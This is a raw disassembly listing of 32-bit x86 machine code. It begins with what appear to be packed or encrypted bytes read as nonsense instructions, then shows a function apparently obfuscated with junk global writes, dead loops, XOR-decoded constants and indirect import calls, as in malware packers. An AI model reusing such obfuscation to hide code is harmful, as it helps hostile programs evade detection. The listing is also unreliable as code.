  40e503:	shl    al,cl
  40e505:	shl    BYTE PTR [eax+0x274bfca2],1
  40e50b:	sbb    al,0x85
  40e50d:	stos   DWORD PTR es:[edi],eax
  40e50e:	fldcw  WORD PTR [ebp+0x16]
  40e511:	mov    esp,0x8843a820
  40e516:	cmp    esp,DWORD PTR [eax]
  40e518:	jbe    0x40e4d6
  40e51a:	xchg   edx,eax
  40e51b:	push   edx
  40e51c:	dec    eax
  40e51d:	arpl   WORD PTR [edx],bp
  40e51f:	aaa    
  40e520:	inc    ecx
  40e521:	sbb    DWORD PTR [edi+0x42573f59],esi
  40e527:	xor    eax,0x46c8bcae
  40e52c:	adc    DWORD PTR [ebp+0x58b52010],edx
  40e532:	lock stos BYTE PTR es:[edi],al
  40e534:	or     eax,0xb6a6b931
  40e539:	add    eax,0x988e02bd
  40e53e:	pop    ebx
  40e53f:	pop    esp
  40e540:	popa   
  40e541:	dec    eax
  40e542:	repz lock mov ebx,0xb7a4c5f5
  40e549:	dec    esp
  40e54a:	push   edi
  40e54b:	xchg   BYTE PTR [edi+0x30],dl
  40e54e:	fs push eax
  40e550:	cmp    eax,0x84a0bbb7
  40e556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e557:	mov    edx,0x99602468
  40e55c:	push   ecx
  40e55d:	jns    0x40e51c
  40e55f:	adc    ah,dh
  40e561:	out    dx,eax
  40e562:	sbb    al,0xaa
  40e564:	lahf   
  40e565:	aas    
  40e566:	xchg   ecx,eax
  40e567:	ret    
  40e568:	int    0x5f
  40e56a:	mov    ecx,0x84875e65
  40e56f:	(bad)  
  40e570:	mov    ch,0x83
  40e572:	sbb    DWORD PTR [edx-0x29f8fb3b],esi
  40e578:	xor    BYTE PTR [edx],dl
  40e57a:	outs   dx,DWORD PTR fs:[esi]
  40e57c:	xchg   ecx,eax
  40e57d:	mov    ebx,0xf147e58e
  40e582:	loope  0x40e532
  40e584:	dec    edi
  40e585:	cs into 
  40e587:	cmp    al,0xff
  40e589:	sbb    al,ah
  40e58b:	imul   ebp,DWORD PTR [ecx+edi*1+0x4aada516],0x6837c604
  40e596:	add    BYTE PTR [esi-0x3a764de],0x4d
  40e59d:	loopne 0x40e56b
  40e59f:	jp     0x40e5a4
  40e5a1:	mov    esp,0xd7aaf1ad
  40e5a6:	loopne 0x40e61a
  40e5a8:	and    ah,al
  40e5aa:	nop
  40e5ab:	cmp    dl,BYTE PTR [esi]
  40e5ad:	cld    
  40e5ae:	cld    
  40e5af:	pop    ecx
  40e5b0:	mov    edx,0x3172345d
  40e5b5:	mov    ecx,DWORD PTR [ecx+eiz*2+0x2a]
  40e5b9:	sar    DWORD PTR [eax+eiz*8-0x4f],cl
  40e5bd:	ins    DWORD PTR es:[edi],dx
  40e5be:	idiv   DWORD PTR [ebx+0x1974e4e5]
  40e5c4:	push   0x3f
  40e5c6:	pop    esp
  40e5c7:	and    ch,BYTE PTR [eax]
  40e5c9:	ficomp DWORD PTR [ebx-0x1e]
  40e5cc:	test   esi,esp
  40e5ce:	sub    ch,al
  40e5d0:	fild   DWORD PTR ds:0x9ae7ad91
  40e5d6:	mov    ds:0x9e093781,eax
  40e5db:	sub    dl,BYTE PTR [esi+0x6760b010]
  40e5e1:	dec    esp
  40e5e2:	adc    al,0xf5
  40e5e4:	mov    es,eax
  40e5e6:	shl    BYTE PTR [esi+eax*2+0x4e],cl
  40e5ea:	mov    esi,0xb5d3221e
  40e5ef:	gs xchg ebp,eax
  40e5f1:	es nop
  40e5f3:	jp     0x40e58b
  40e5f5:	ret    0x3ddb
  40e5f8:	test   BYTE PTR [edi+edx*2-0x63],dh
  40e5fc:	jns    0x40e624
  40e5fe:	inc    edx
  40e5ff:	pop    ds
  40e600:	push   edi
  40e601:	add    DWORD PTR [edi],ecx
  40e603:	or     al,0xd6
  40e605:	imul   eax,DWORD PTR [edx],0x6a94f23
  40e60b:	jp     0x40e5af
  40e60d:	in     al,dx
  40e60e:	int3   
  40e60f:	xor    DWORD PTR [ebx-0x48],ecx
  40e612:	fimul  WORD PTR [esi+0x51125a02]
  40e618:	outs   dx,DWORD PTR ds:[esi]
  40e619:	inc    esi
  40e61a:	rcl    DWORD PTR [edi],1
  40e61c:	or     dl,ch
  40e61e:	int    0xdd
  40e620:	adc    BYTE PTR [esi+ecx*4],ah
  40e623:	stos   DWORD PTR es:[edi],eax
  40e624:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e625:	arpl   WORD PTR [edx],sp
  40e627:	dec    edi
  40e628:	dec    esp
  40e629:	(bad)  
  40e62a:	in     al,dx
  40e62b:	icebp  
  40e62c:	int3   
  40e62d:	data16 sti 
  40e62f:	shl    BYTE PTR [edx],1
  40e631:	inc    esp
  40e632:	loop   0x40e689
  40e634:	xor    BYTE PTR [esi+eiz*2],ah
  40e637:	inc    edx
  40e638:	and    esp,edx
  40e63a:	or     ch,ch
  40e63c:	add    eax,0xeef63692
  40e641:	inc    eax
  40e642:	pop    es
  40e643:	inc    BYTE PTR [ebx]
  40e645:	push   cs
  40e646:	out    dx,eax
  40e647:	add    eax,DWORD PTR [ecx-0x40]
  40e64a:	retf   
  40e64b:	dec    ecx
  40e64c:	scas   al,BYTE PTR es:[edi]
  40e64d:	out    0xe6,al
  40e64f:	enter  0x1922,0xe9
  40e653:	or     edx,DWORD PTR [ebp+0x141ad9bf]
  40e659:	fcomp  QWORD PTR [ecx+edx*2-0x2e227d7a]
  40e660:	jmp    0xd96dcd8b
  40e665:	ret    
  40e666:	cmp    ch,bh
  40e668:	stos   DWORD PTR es:[edi],eax
  40e669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e66a:	(bad)  
  40e66b:	in     eax,0xa4
  40e66d:	stos   BYTE PTR es:[edi],al
  40e66e:	xchg   esi,eax
  40e66f:	aas    
  40e670:	arpl   WORD PTR [ebx],ax
  40e672:	outs   dx,DWORD PTR ds:[esi]
  40e673:	(bad)  [esi-0x52]
  40e676:	sub    al,0xa6
  40e678:	inc    esi
  40e679:	lahf   
  40e67a:	inc    ebx
  40e67b:	or     eax,0x19f5299a
  40e680:	lods   eax,DWORD PTR ds:[esi]
  40e681:	pop    ebx
  40e682:	pop    ss
  40e683:	repnz loopne 0x40e6b0
  40e686:	sub    DWORD PTR [edi],0x472e913e
  40e68c:	or     edx,ebx
  40e68e:	pusha  
  40e68f:	adc    al,0x58
  40e691:	out    dx,al
  40e692:	imul   eax,ecx,0x2c
  40e695:	fs repnz in al,0x8d
  40e699:	retf   
  40e69a:	(bad)  
  40e69b:	ja     0x40e69f
  40e69d:	xchg   esp,eax
  40e69e:	jp     0x40e667
  40e6a0:	mov    cl,0x7b
  40e6a2:	push   ebp
  40e6a3:	outs   dx,DWORD PTR ds:[esi]
  40e6a4:	ss pop ebp
  40e6a6:	into   
  40e6a7:	popf   
  40e6a8:	cli    
  40e6a9:	(bad)  
  40e6aa:	retf   0xc5ca
  40e6ad:	mov    edi,DWORD PTR [edx]
  40e6af:	and    dh,BYTE PTR [edx-0x58]
  40e6b2:	stos   BYTE PTR es:[edi],al
  40e6b3:	fdiv   st,st(0)
  40e6b5:	sub    ecx,eax
  40e6b7:	cmp    bl,ah
  40e6b9:	sti    
  40e6ba:	cmp    DWORD PTR [eax-0x71492236],esp
  40e6c0:	mov    ebp,0xf4647680
  40e6c5:	mov    bl,0xa0
  40e6c7:	jae    0x40e6b1
  40e6c9:	pop    edi
  40e6ca:	leave  
  40e6cb:	ret    0x8
  40e6ce:	push   ebp
  40e6cf:	mov    ebp,esp
  40e6d1:	sub    esp,0xa8
  40e6d7:	sbb    DWORD PTR ds:0x434793,0x1bda
  40e6e1:	push   ebx
  40e6e2:	sbb    DWORD PTR ds:0x434743,0x5a23
  40e6ec:	push   esi
  40e6ed:	inc    DWORD PTR ds:0x4346c7
  40e6f3:	push   edi
  40e6f4:	and    DWORD PTR ds:0x4346bb,0x6624
  40e6fe:	push   0x414c56
  40e703:	adc    DWORD PTR ds:0x434683,0x6b43
  40e70d:	call   DWORD PTR ds:0x41340c
  40e713:	test   eax,eax
  40e715:	mov    DWORD PTR ds:0x4346b7,0x267
  40e71f:	je     0x40e741
  40e725:	adc    DWORD PTR ds:0x434747,0x43465f
  40e72f:	xor    eax,eax
  40e731:	inc    eax
  40e732:	mov    DWORD PTR ds:0x43466b,0x5274
  40e73c:	jmp    0x40f150
  40e741:	add    DWORD PTR ds:0x4346bb,ecx
  40e747:	mov    DWORD PTR [ebp-0x24],0xf89c8536
  40e74e:	and    DWORD PTR ds:0x434753,0x0
  40e758:	jmp    0x40e76a
  40e75d:	mov    edi,DWORD PTR ds:0x434753
  40e763:	inc    edi
  40e764:	mov    DWORD PTR ds:0x434753,edi
  40e76a:	cmp    DWORD PTR ds:0x434753,0x16
  40e771:	jae    0x40e855
  40e777:	cmp    DWORD PTR ds:0x434753,0xd
  40e77e:	jne    0x40e79e
  40e784:	push   0x43466b
  40e789:	push   0x6202
  40e78e:	push   0x434808
  40e793:	push   0x4348f1
  40e798:	call   DWORD PTR ds:0x413344
  40e79e:	cmp    DWORD PTR ds:0x434753,0xc
  40e7a5:	jne    0x40e7b8
  40e7ab:	mov    edi,DWORD PTR ds:0x434753
  40e7b1:	inc    edi
  40e7b2:	mov    DWORD PTR ds:0x434753,edi
  40e7b8:	jmp    0x40e75d
  40e7bd:	and    DWORD PTR ds:0x4346fb,0x0
  40e7c7:	jmp    0x40e7d9
  40e7cc:	mov    edi,DWORD PTR ds:0x4346fb
  40e7d2:	inc    edi
  40e7d3:	mov    DWORD PTR ds:0x4346fb,edi
  40e7d9:	cmp    DWORD PTR ds:0x4346fb,0x11
  40e7e0:	jae    0x40e855
  40e7e6:	cmp    DWORD PTR ds:0x4346fb,0x1c
  40e7ed:	jne    0x40e806
  40e7f3:	push   0x43499f
  40e7f8:	push   DWORD PTR [ebp-0x24]
  40e7fb:	push   0x501d
  40e800:	call   DWORD PTR ds:0x413348
  40e806:	jmp    0x40e7cc
  40e80b:	mov    DWORD PTR ds:0x4346bb,0x17
  40e815:	cmp    DWORD PTR ds:0x4346bb,0x0
  40e81c:	je     0x40e855
  40e822:	cmp    DWORD PTR ds:0x4346bb,0x24
  40e829:	jne    0x40e83d
  40e82f:	push   0x3379
  40e834:	push   DWORD PTR [ebp-0x24]
  40e837:	call   DWORD PTR ds:0x4130c8
  40e83d:	mov    ecx,DWORD PTR ds:0x4346bb
  40e843:	dec    ecx
  40e844:	mov    DWORD PTR ds:0x4346bb,ecx
  40e84a:	jmp    0x40e815
  40e84f:	sub    DWORD PTR ds:0x43470b,edx
  40e855:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  40e85c:	sbb    DWORD PTR ds:0x43473f,0x434687
  40e866:	lea    eax,[ebp-0x2c]
  40e869:	movzx  ecx,BYTE PTR ds:0x434673
  40e870:	and    ecx,DWORD PTR ds:0x43474f
  40e876:	mov    DWORD PTR ds:0x434673,ecx
  40e87c:	mov    DWORD PTR [ebp-0x18],eax
  40e87f:	mov    DWORD PTR ds:0x4346c7,0x13
  40e889:	cmp    DWORD PTR ds:0x4346c7,0x0
  40e890:	je     0x40e94f
  40e896:	cmp    DWORD PTR ds:0x4346c7,0x3
  40e89d:	jne    0x40e8b6
  40e8a3:	push   0x8243
  40e8a8:	push   0x5b51
  40e8ad:	push   DWORD PTR [ebp-0x18]
  40e8b0:	call   DWORD PTR ds:0x4130cc
  40e8b6:	cmp    DWORD PTR ds:0x4346c7,0x4
  40e8bd:	jne    0x40e8d0
  40e8c3:	mov    esi,DWORD PTR ds:0x4346c7
  40e8c9:	dec    esi
  40e8ca:	mov    DWORD PTR ds:0x4346c7,esi
  40e8d0:	xor    esi,esi
  40e8d2:	add    esi,DWORD PTR ds:0x4346c7
  40e8d8:	dec    esi
  40e8d9:	mov    DWORD PTR ds:0x4346c7,esi
  40e8df:	jmp    0x40e889
  40e8e4:	and    DWORD PTR ds:0x4346fb,0x0
  40e8ee:	jmp    0x40e900
  40e8f3:	mov    edi,DWORD PTR ds:0x4346fb
  40e8f9:	inc    edi
  40e8fa:	mov    DWORD PTR ds:0x4346fb,edi
  40e900:	cmp    DWORD PTR ds:0x4346fb,0x19
  40e907:	jae    0x40e94f
  40e90d:	cmp    DWORD PTR ds:0x4346fb,0xd
  40e914:	jne    0x40e92a
  40e91a:	push   0x6845
  40e91f:	push   0x434873
  40e924:	call   DWORD PTR ds:0x41334c
  40e92a:	cmp    DWORD PTR ds:0x4346fb,0xc
  40e931:	jne    0x40e944
  40e937:	mov    edi,DWORD PTR ds:0x4346fb
  40e93d:	inc    edi
  40e93e:	mov    DWORD PTR ds:0x4346fb,edi
  40e944:	jmp    0x40e8f3
  40e949:	sub    DWORD PTR ds:0x4346bf,edi
  40e94f:	lea    eax,[ebp-0x30]
  40e952:	mov    ecx,DWORD PTR ds:0x434707
  40e958:	adc    DWORD PTR ds:0x434737,ecx
  40e95e:	mov    DWORD PTR [ebp-0x14],eax
  40e961:	mov    esi,DWORD PTR ds:0x43469b
  40e967:	xor    ecx,ecx
  40e969:	or     ecx,DWORD PTR ds:0x4346d7
  40e96f:	sub    esi,ecx
  40e971:	or     esi,DWORD PTR [esi+ecx*1]
  40e974:	mov    eax,ds:0x414afe
  40e979:	mov    ebx,DWORD PTR ds:0x434733
  40e97f:	mov    ebx,DWORD PTR [ebx]
  40e981:	sub    DWORD PTR ds:0x43467f,ebx
  40e987:	mov    eax,DWORD PTR [eax+0x1c8]
  40e98d:	mov    eax,DWORD PTR [eax]
  40e98f:	or     edi,0x2360
  40e995:	mov    ecx,DWORD PTR [ebp-0x14]
  40e998:	mov    esi,0x7510851
  40e99d:	and    DWORD PTR ds:0x4346c7,0x6472
  40e9a7:	xor    eax,esi
  40e9a9:	sbb    edi,DWORD PTR ds:0x43467b
  40e9af:	mov    edi,0x327299
  40e9b4:	xor    DWORD PTR ds:0x43467b,ebx
  40e9ba:	add    eax,edi
  40e9bc:	mov    DWORD PTR [ecx],eax
  40e9be:	mov    eax,ds:0x414dae
  40e9c3:	movzx  ebx,WORD PTR ds:0x434777
  40e9ca:	cmp    eax,0x22c02f45
  40e9cf:	mov    eax,DWORD PTR [ebp-0x4]
  40e9d2:	movzx  ebx,BYTE PTR ds:0x434747
  40e9d9:	mov    ebx,0xf89c853a
  40e9de:	je     0x40ea1a
  40e9e4:	sub    DWORD PTR ds:0x43477f,edi
  40e9ea:	mov    ecx,DWORD PTR [ebp-0x24]
  40e9ed:	xor    eax,esi
  40e9ef:	add    eax,edi
  40e9f1:	sbb    DWORD PTR ds:0x434783,0x3fff
  40e9fb:	imul   eax,ecx
  40e9fe:	mov    DWORD PTR ds:0x434677,0x22e4
  40ea08:	mov    DWORD PTR [ebp-0x24],eax
  40ea0b:	mov    DWORD PTR ds:0x4346c7,0x3208
  40ea15:	jmp    0x40eab6
  40ea1a:	add    DWORD PTR ds:0x43473f,0x154a
  40ea24:	xor    eax,esi
  40ea26:	sbb    DWORD PTR ds:0x4346c7,0x7bc1
  40ea30:	add    eax,edi
  40ea32:	mov    ds:0x414c12,eax
  40ea37:	movzx  eax,BYTE PTR ds:0x43473b
  40ea3e:	sub    DWORD PTR ds:0x43473f,eax
  40ea44:	mov    eax,DWORD PTR [ebp-0x24]
  40ea47:	xor    eax,esi
  40ea49:	adc    DWORD PTR ds:0x43470f,ebx
  40ea4f:	add    eax,edi
  40ea51:	not    ecx
  40ea53:	mov    ds:0x414dae,eax
  40ea58:	mov    eax,DWORD PTR [ebp-0x4]
  40ea5b:	mov    ecx,DWORD PTR ds:0x414c12
  40ea61:	xor    eax,esi
  40ea63:	xor    DWORD PTR ds:0x434683,0x434743
  40ea6d:	add    eax,edi
  40ea6f:	mov    DWORD PTR ds:0x43470b,0x4a46
  40ea79:	cmp    ecx,eax
  40ea7b:	jne    0x40eab6
  40ea81:	sbb    DWORD PTR ds:0x434683,0x4346cf
  40ea8b:	push   ebx
  40ea8c:	mov    DWORD PTR ds:0x43473f,0x49e8
  40ea96:	push   DWORD PTR [ebp-0x4]
  40ea99:	sbb    DWORD PTR ds:0x4346bf,0x7dd1
  40eaa3:	push   DWORD PTR [ebp-0x24]
  40eaa6:	adc    DWORD PTR ds:0x43466f,0x434683
  40eab0:	call   DWORD PTR ds:0x414c0a
  40eab6:	and    edx,DWORD PTR ds:0x434683
  40eabc:	mov    eax,ds:0x414afe
  40eac1:	mov    ecx,DWORD PTR ds:0x434713
  40eac7:	and    DWORD PTR ds:0x4346c3,ecx
  40eacd:	mov    eax,DWORD PTR [eax+0x18c]
  40ead3:	sub    ecx,edx
  40ead5:	mov    eax,DWORD PTR [eax]
  40ead7:	neg    ecx
  40ead9:	mov    DWORD PTR [ebp-0x44],eax
  40eadc:	mov    DWORD PTR [ebp-0x10],ebx
  40eadf:	sub    ecx,DWORD PTR ds:0x43478f
  40eae5:	mov    DWORD PTR [ebp-0x10],ebx
  40eae8:	and    DWORD PTR ds:0x4346bf,0x0
  40eaf2:	jmp    0x40eb04
  40eaf7:	mov    ecx,DWORD PTR ds:0x4346bf
  40eafd:	inc    ecx
  40eafe:	mov    DWORD PTR ds:0x4346bf,ecx
  40eb04:	cmp    DWORD PTR ds:0x4346bf,0x1d
  40eb0b:	jae    0x40eb61
  40eb11:	cmp    DWORD PTR ds:0x4346bf,0x7
  40eb18:	jne    0x40eb2c
  40eb1e:	push   DWORD PTR [ebp-0x18]
  40eb21:	push   0x7577
  40eb26:	call   DWORD PTR ds:0x4130d0
  40eb2c:	cmp    DWORD PTR ds:0x4346bf,0x6
  40eb33:	jne    0x40eb48
  40eb39:	xor    ecx,ecx
  40eb3b:	add    ecx,DWORD PTR ds:0x4346bf
  40eb41:	inc    ecx
  40eb42:	mov    DWORD PTR ds:0x4346bf,ecx
  40eb48:	jmp    0x40eaf7
  40eb4d:	xor    edx,edx
  40eb4f:	or     edx,DWORD PTR ds:0x4346c7
  40eb55:	sbb    edx,DWORD PTR ds:0x434787
  40eb5b:	mov    DWORD PTR ds:0x4346c7,edx
  40eb61:	mov    DWORD PTR [ebp-0x10],ebx
  40eb64:	mov    ecx,DWORD PTR ds:0x43478b
  40eb6a:	or     DWORD PTR ds:0x43473b,ecx
  40eb70:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  40eb77:	or     eax,edx
  40eb79:	mov    DWORD PTR [ebp-0x10],ebx
  40eb7c:	mov    DWORD PTR [ebp-0x10],0xf89c853e
  40eb83:	xor    ecx,DWORD PTR ds:0x4346b7
  40eb89:	mov    eax,DWORD PTR [ebp-0x24]
  40eb8c:	and    edx,0x522c
  40eb92:	mov    ecx,DWORD PTR [ebp-0x4]
  40eb95:	and    DWORD PTR ds:0x43478f,edx
  40eb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40eb9e:	or     DWORD PTR ds:0x43478b,0x434747
  40eba8:	xor    edx,esi
  40ebaa:	sub    DWORD PTR ds:0x4346cf,0x434687
  40ebb4:	xor    ecx,esi
  40ebb6:	adc    DWORD PTR ds:0x43473f,0x43477b
  40ebc0:	add    ecx,edx
  40ebc2:	mov    edx,DWORD PTR [ebp-0x4]
  40ebc5:	adc    DWORD PTR ds:0x434677,0x4346f7
  40ebcf:	xor    eax,esi
  40ebd1:	xor    edx,esi
  40ebd3:	adc    DWORD PTR ds:0x434663,0x6faf
  40ebdd:	add    eax,edi
  40ebdf:	mov    DWORD PTR ds:0x434703,0x13
  40ebe9:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ebf0:	mov    DWORD PTR ds:0x4346bb,0x74ca
  40ebfa:	mov    DWORD PTR [ebp-0x20],eax
  40ebfd:	mov    DWORD PTR ds:0x4346c3,0x777a
  40ec07:	cmp    eax,ecx
  40ec09:	mov    DWORD PTR ds:0x434793,0x6f86
  40ec13:	ja     0x40ed7b
  40ec19:	jmp    0x40ec27
  40ec1e:	adc    DWORD PTR ds:0x4346fb,edi
  40ec24:	mov    eax,DWORD PTR [ebp-0x20]
  40ec27:	add    DWORD PTR ds:0x434783,0x32bd
  40ec31:	mov    ecx,DWORD PTR [ebp-0x4]
  40ec34:	xor    ecx,esi
  40ec36:	xor    DWORD PTR ds:0x434667,0x43470f
  40ec40:	lea    eax,[ecx+eax*1+0x327299]
  40ec47:	push   eax
  40ec48:	and    DWORD PTR ds:0x434713,0x0
  40ec52:	xor    eax,eax
  40ec54:	or     eax,DWORD PTR ds:0x434713
  40ec5a:	inc    eax
  40ec5b:	mov    ds:0x434713,eax
  40ec60:	cmp    DWORD PTR ds:0x434713,0x10
  40ec67:	jne    0x40ec76
  40ec6d:	push   DWORD PTR [ebp-0x1c]
  40ec70:	call   DWORD PTR ds:0x413350
  40ec76:	cmp    DWORD PTR ds:0x434713,0xf
  40ec7d:	jne    0x40ec91
  40ec83:	xor    eax,eax
  40ec85:	add    eax,DWORD PTR ds:0x434713
  40ec8b:	inc    eax
  40ec8c:	mov    ds:0x434713,eax
  40ec91:	cmp    DWORD PTR ds:0x434713,0x1c
  40ec98:	jb     0x40ec52
  40ec9e:	movzx  eax,BYTE PTR ds:0x434663
  40eca5:	adc    eax,DWORD PTR ds:0x4346fb
  40ecab:	mov    ds:0x434663,eax
  40ecb0:	mov    eax,DWORD PTR [ebp-0x14]
  40ecb3:	xor    eax,esi
  40ecb5:	mov    DWORD PTR ds:0x4346bf,0x3b17
  40ecbf:	lea    eax,[ebp+eax*1+0x3272a1]
  40ecc6:	sub    DWORD PTR ds:0x434777,0x434683
  40ecd0:	push   eax
  40ecd1:	and    eax,DWORD PTR ds:0x4346fb
  40ecd7:	mov    eax,ds:0x414afe
  40ecdc:	adc    DWORD PTR ds:0x4346b7,0x7c2
  40ece6:	push   DWORD PTR [eax+0x1bc]
  40ecec:	call   0x4028d7
  40ecf1:	mov    eax,DWORD PTR [ebp-0x4]
  40ecf4:	mov    ecx,DWORD PTR [ebp-0x20]
  40ecf7:	mov    edx,DWORD PTR ds:0x43477b
  40ecfd:	or     DWORD PTR ds:0x434793,edx
  40ed03:	xor    eax,esi
  40ed05:	lea    eax,[ecx+eax*1+0x327299]
  40ed0c:	mov    ecx,DWORD PTR [ebp-0x4]
  40ed0f:	or     DWORD PTR ds:0x4346c3,edi
  40ed15:	mov    edx,DWORD PTR [ebp-0x4]
  40ed18:	sub    DWORD PTR ds:0x4346f7,0x283f
  40ed22:	xor    edx,esi
  40ed24:	xor    DWORD PTR ds:0x434753,0x4346b7
  40ed2e:	xor    ecx,esi
  40ed30:	add    ecx,edx
  40ed32:	mov    edx,DWORD PTR [ebp-0x4]
  40ed35:	and    DWORD PTR ds:0x434777,0x43467f
  40ed3f:	xor    edx,esi
  40ed41:	mov    DWORD PTR ds:0x4346b7,0x5401
  40ed4b:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ed52:	mov    DWORD PTR ds:0x434687,0x25c8
  40ed5c:	mov    DWORD PTR [ebp-0x20],eax
  40ed5f:	mov    DWORD PTR ds:0x4346bf,0x56d4
  40ed69:	cmp    eax,ecx
  40ed6b:	mov    DWORD PTR ds:0x434687,0x74b6
  40ed75:	jbe    0x40ec1e
  40ed7b:	mov    DWORD PTR ds:0x43477f,0x4be2
  40ed85:	mov    eax,DWORD PTR [ebp+0xc]
  40ed88:	add    DWORD PTR ds:0x434787,edx
  40ed8e:	mov    ds:0x414982,eax
  40ed93:	mov    eax,DWORD PTR [ebp+0x10]
  40ed96:	mov    ds:0x414bd6,eax
  40ed9b:	and    DWORD PTR ds:0x434747,0x0
  40eda5:	mov    ecx,DWORD PTR ds:0x434747
  40edab:	inc    ecx
  40edac:	mov    DWORD PTR ds:0x434747,ecx
  40edb2:	cmp    DWORD PTR ds:0x434747,0x1f
  40edb9:	jne    0x40edca
  40edbf:	push   0x4349db
  40edc4:	call   DWORD PTR ds:0x413354
  40edca:	cmp    DWORD PTR ds:0x434747,0x13
  40edd1:	jb     0x40eda5
  40edd7:	add    ecx,eax
  40edd9:	mov    eax,ds:0x414982
  40edde:	inc    ecx
  40eddf:	mov    ecx,DWORD PTR [ebp-0x18]
  40ede2:	sub    DWORD PTR ds:0x4346cf,0x1b10
  40edec:	push   DWORD PTR [ebp-0x44]
  40edef:	or     DWORD PTR ds:0x434743,0x434777
  40edf9:	sub    eax,edi
  40edfb:	sub    DWORD PTR ds:0x43467f,0x43466f
  40ee05:	push   DWORD PTR [ebp-0x30]
  40ee08:	adc    DWORD PTR ds:0x4346bb,0x5064
  40ee12:	xor    eax,esi
  40ee14:	mov    DWORD PTR [ecx],eax
  40ee16:	push   DWORD PTR [ebp-0x2c]
  40ee19:	call   0x40f157
  40ee1e:	sub    eax,edi
  40ee20:	adc    ecx,DWORD PTR ds:0x43466f
  40ee26:	xor    eax,esi
  40ee28:	mov    DWORD PTR ds:0x43467f,0x13
  40ee32:	cmp    DWORD PTR ds:0x43467f,0x0
  40ee39:	je     0x40ee7a
  40ee3f:	cmp    DWORD PTR ds:0x43467f,0x18
  40ee46:	jne    0x40ee68
  40ee4c:	push   0x4349db
  40ee51:	push   DWORD PTR [ebp-0xc]
  40ee54:	push   DWORD PTR [ebp-0x28]
  40ee57:	push   DWORD PTR [ebp-0x1c]
  40ee5a:	push   DWORD PTR [ebp-0x20]
  40ee5d:	push   0x2408
  40ee62:	call   DWORD PTR ds:0x413358
  40ee68:	mov    ecx,DWORD PTR ds:0x43467f
  40ee6e:	dec    ecx
  40ee6f:	mov    DWORD PTR ds:0x43467f,ecx
  40ee75:	jmp    0x40ee32
  40ee7a:	mov    DWORD PTR [ebp+0xc],eax
  40ee7d:	mov    ecx,DWORD PTR [ebp-0x4]
  40ee80:	mov    eax,DWORD PTR [ebp+0xc]
  40ee83:	xor    ecx,esi
  40ee85:	add    ecx,edi
  40ee87:	xor    edx,edx
  40ee89:	div    ecx
  40ee8b:	mov    ecx,DWORD PTR [ebp-0x24]
  40ee8e:	cmp    ecx,eax
  40ee90:	jne    0x40f0b9
  40ee96:	mov    eax,ds:0x414afe
  40ee9b:	mov    DWORD PTR [ebp+0x10],eax
  40ee9e:	mov    eax,ds:0x414c0e
  40eea3:	mov    DWORD PTR [ebp-0x50],eax
  40eea6:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40eead:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40eeb4:	mov    DWORD PTR [ebp-0x4c],0xf89cb536
  40eebb:	mov    DWORD PTR [ebp-0x64],0xf89f0536
  40eec2:	mov    DWORD PTR [ebp-0x60],0xf89c85f6
  40eec9:	mov    DWORD PTR [ebp-0x54],0xf89c85d6
  40eed0:	mov    eax,DWORD PTR [ebp-0x18]
  40eed3:	xor    eax,esi
  40eed5:	add    eax,edi
  40eed7:	mov    DWORD PTR [ebp-0xc],eax
  40eeda:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  40eee1:	mov    BYTE PTR [ebp-0x25],0x67
  40eee5:	mov    eax,DWORD PTR [ebp-0x18]
  40eee8:	xor    eax,esi
  40eeea:	add    eax,edi
  40eeec:	mov    DWORD PTR [ebp-0xc],eax
  40eeef:	mov    eax,DWORD PTR [ebp-0x54]
  40eef2:	xor    eax,esi
  40eef4:	add    eax,edi
  40eef6:	mov    DWORD PTR [ebp-0x40],eax
  40eef9:	mov    eax,DWORD PTR [ebp-0x4c]
  40eefc:	xor    eax,esi
  40eefe:	add    eax,edi
  40ef00:	mov    DWORD PTR [ebp-0x38],eax
  40ef03:	mov    eax,DWORD PTR [ebp-0x3c]
  40ef06:	xor    eax,esi
  40ef08:	add    eax,edi
  40ef0a:	mov    DWORD PTR [ebp-0x34],eax
  40ef0d:	lea    eax,[ebp-0xa8]
  40ef13:	mov    DWORD PTR [ebp+0xc],eax
  40ef16:	mov    eax,DWORD PTR [ebp-0x18]
  40ef19:	mov    DWORD PTR [ebp-0x14],eax
  40ef1c:	mov    eax,DWORD PTR [ebp-0x20]
  40ef1f:	mov    DWORD PTR [ebp-0x5c],ebx
  40ef22:	mov    DWORD PTR [ebp-0x10],eax
  40ef25:	mov    eax,DWORD PTR [ebp-0x5c]
  40ef28:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef2b:	xor    eax,esi
  40ef2d:	add    eax,0x327299
  40ef32:	mov    DWORD PTR [ecx],eax
  40ef34:	mov    eax,DWORD PTR [ebp-0x14]
  40ef37:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef3a:	xor    eax,esi
  40ef3c:	add    eax,edi
  40ef3e:	mov    DWORD PTR [ecx+0x4],eax
  40ef41:	mov    eax,DWORD PTR [ebp-0x34]
  40ef44:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef47:	mov    DWORD PTR [ecx+0x8],eax
  40ef4a:	mov    eax,DWORD PTR [ebp-0x38]
  40ef4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef50:	mov    DWORD PTR [ecx+0xc],eax
  40ef53:	mov    eax,DWORD PTR [ebp-0x40]
  40ef56:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef59:	mov    DWORD PTR [ecx+0x10],eax
  40ef5c:	mov    eax,eax
  40ef5e:	mov    eax,DWORD PTR [ebp-0x10]
  40ef61:	xor    eax,esi
  40ef63:	add    eax,edi
  40ef65:	je     0x40ef96
  40ef6b:	lea    eax,[ebp-0xa8]
  40ef71:	push   eax
  40ef72:	mov    eax,DWORD PTR [ebp-0x20]
  40ef75:	xor    eax,esi
  40ef77:	add    eax,edi
  40ef79:	push   eax
  40ef7a:	mov    eax,DWORD PTR [ebp+0x10]
  40ef7d:	add    eax,0xaa
  40ef82:	push   eax
  40ef83:	mov    eax,DWORD PTR [ebp+0x10]
  40ef86:	mov    eax,DWORD PTR [eax+0x198]
  40ef8c:	push   DWORD PTR [eax]
  40ef8e:	call   0x411333
